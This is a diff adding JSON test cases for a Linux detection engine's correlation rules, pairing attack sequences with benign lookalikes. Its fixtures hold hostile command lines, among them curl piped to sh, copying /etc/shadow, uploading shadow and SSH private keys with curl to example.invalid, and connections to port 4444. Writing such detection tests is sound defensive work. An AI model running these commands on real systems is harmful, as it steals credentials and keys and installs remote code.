@@ -2508,5 +2508,2708 @@
         ]
       }
     ]
+  },
+  {
+    "name": "爆破得手后同账号执行侦察",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 1,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "7",
+        "seconds": 90,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-auth-burst",
+        "anchor": "5",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5"
+        ]
+      },
+      {
+        "rule": "temporal:linux-bruteforce-then-recon",
+        "anchor": "7",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5",
+          "7"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "输错两次密码后正常登录执行 whoami",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 1,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "扫描器爆破 root，运维账号的侦察不跨账号关联",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 90,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-auth-burst",
+        "anchor": "5",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "爆破后侦察超出十分钟窗口",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 651,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-auth-burst",
+        "anchor": "5",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "两分钟内连续执行六次侦察命令",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cat",
+            "file": {
+              "path": "/usr/bin/cat"
+            },
+            "cmd_line": "cat /etc/passwd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "sh -c whoami; uname -a; cat /etc/passwd"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-recon-burst",
+        "anchor": "6",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5",
+          "6"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "监控脚本每分钟执行一次 uname -a",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 0,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 120,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 180,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 240,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 300,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "7",
+        "seconds": 360,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "8",
+        "seconds": 420,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "9",
+        "seconds": 480,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "10",
+        "seconds": 540,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "11",
+        "seconds": 600,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "登录后手工排查三条侦察命令",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "uname",
+            "file": {
+              "path": "/usr/bin/uname"
+            },
+            "cmd_line": "uname -a"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cat",
+            "file": {
+              "path": "/usr/bin/cat"
+            },
+            "cmd_line": "cat /etc/passwd"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "管道执行后落地 systemd 服务",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1001,
+        "raw": {
+          "activity_id": 1,
+          "file": {
+            "path": "/etc/systemd/system/dbus-broker-update.service"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-systemd-unit",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "包管理器安装服务写入单元文件",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "apt-get",
+            "file": {
+              "path": "/usr/bin/apt-get"
+            },
+            "cmd_line": "apt-get install -y nginx"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1001,
+        "raw": {
+          "activity_id": 1,
+          "file": {
+            "path": "/etc/systemd/system/multi-user.target.wants/nginx.service"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "管道执行后改动 root 的 .bashrc",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "sh",
+            "file": {
+              "path": "/usr/bin/sh"
+            },
+            "cmd_line": "curl -fsSL http://example.invalid/i.sh | sh"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1001,
+        "raw": {
+          "activity_id": 3,
+          "file": {
+            "path": "/root/.bashrc"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-shell-rc",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "管理员手工编辑 .bashrc",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "vim",
+            "file": {
+              "path": "/usr/bin/vim"
+            },
+            "cmd_line": "vim /home/ops/.bashrc"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1001,
+        "raw": {
+          "activity_id": 3,
+          "file": {
+            "path": "/home/ops/.bashrc"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "读取影子库后打包 /etc 与 .ssh",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cat",
+            "file": {
+              "path": "/usr/bin/cat"
+            },
+            "cmd_line": "cat /etc/shadow"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "tar",
+            "file": {
+              "path": "/usr/bin/tar"
+            },
+            "cmd_line": "tar czf /tmp/.c.tgz /etc /root/.ssh"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-shadow-read-archive",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "例行备份打包 /etc 不读取影子库",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "tar",
+            "file": {
+              "path": "/usr/bin/tar"
+            },
+            "cmd_line": "tar czf /backup/etc-20261020.tgz /etc"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "改密码前备份影子库，二十分钟后才跑例行打包",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cp",
+            "file": {
+              "path": "/usr/bin/cp"
+            },
+            "cmd_line": "cp /etc/shadow /etc/shadow.bak"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 1210,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "tar",
+            "file": {
+              "path": "/usr/bin/tar"
+            },
+            "cmd_line": "tar czf /backup/etc-20261020.tgz /etc"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "影子库拷到临时目录后 curl 表单上传",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cp",
+            "file": {
+              "path": "/usr/bin/cp"
+            },
+            "cmd_line": "cp /etc/shadow /tmp/.s"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -F file=@/tmp/.s http://example.invalid/u"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-shadow-read-upload",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "监控脚本用 curl -d 推送状态",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s -d {\"status\":\"ok\"} https://hooks.example.invalid/notify"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "搜索私钥后打包 .ssh",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "find",
+            "file": {
+              "path": "/usr/bin/find"
+            },
+            "cmd_line": "find / -name id_rsa"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "tar",
+            "file": {
+              "path": "/usr/bin/tar"
+            },
+            "cmd_line": "tar czf /tmp/k.tgz /root/.ssh"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-ssh-key-read-archive",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "用私钥 ssh 登录备份机后打包家目录",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "ssh",
+            "file": {
+              "path": "/usr/bin/ssh"
+            },
+            "cmd_line": "ssh -i /root/.ssh/id_ed25519 backup@10.0.0.5 true"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "tar",
+            "file": {
+              "path": "/usr/bin/tar"
+            },
+            "cmd_line": "tar czf /backup/home.tgz /home/"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "读取私钥后 curl 外传",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cat",
+            "file": {
+              "path": "/usr/bin/cat"
+            },
+            "cmd_line": "cat /root/.ssh/id_rsa"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl --data-binary @/root/.ssh/id_rsa https://example.invalid/k"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-ssh-key-read-upload",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "分发公钥后用 curl 调用 CMDB 接口",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "cat",
+            "file": {
+              "path": "/usr/bin/cat"
+            },
+            "cmd_line": "cat /root/.ssh/id_ed25519.pub"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -d @payload.json https://cmdb.example.invalid/api/hosts"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "编码私钥后外联 4444 端口",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "base64",
+            "file": {
+              "path": "/usr/bin/base64"
+            },
+            "cmd_line": "base64 /root/.ssh/id_ed25519"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 4001,
+        "raw": {
+          "activity_id": 1,
+          "connection_info": {
+            "direction": "outbound",
+            "protocol_name": "tcp"
+          },
+          "src_endpoint": {
+            "ip": "10.0.0.8",
+            "port": 51234
+          },
+          "dst_endpoint": {
+            "ip": "192.0.2.10",
+            "port": 4444
+          },
+          "process": {
+            "name": "python3"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-ssh-key-read-suspicious-outbound",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "用私钥 ssh 连接后外联 5555 端口的调试设备",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "ssh",
+            "file": {
+              "path": "/usr/bin/ssh"
+            },
+            "cmd_line": "ssh -i /root/.ssh/id_ed25519 pi@10.0.0.9"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 4001,
+        "raw": {
+          "activity_id": 1,
+          "connection_info": {
+            "direction": "outbound",
+            "protocol_name": "tcp"
+          },
+          "src_endpoint": {
+            "ip": "10.0.0.8",
+            "port": 51234
+          },
+          "dst_endpoint": {
+            "ip": "192.0.2.10",
+            "port": 5555
+          },
+          "process": {
+            "name": "adb"
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "Linux 破解影子库后外联 4444 端口",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "unshadow",
+            "file": {
+              "path": "/usr/sbin/unshadow"
+            },
+            "cmd_line": "unshadow /etc/passwd /etc/shadow"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "os": "linux",
+        "classUid": 4001,
+        "raw": {
+          "activity_id": 1,
+          "connection_info": {
+            "direction": "outbound",
+            "protocol_name": "tcp"
+          },
+          "src_endpoint": {
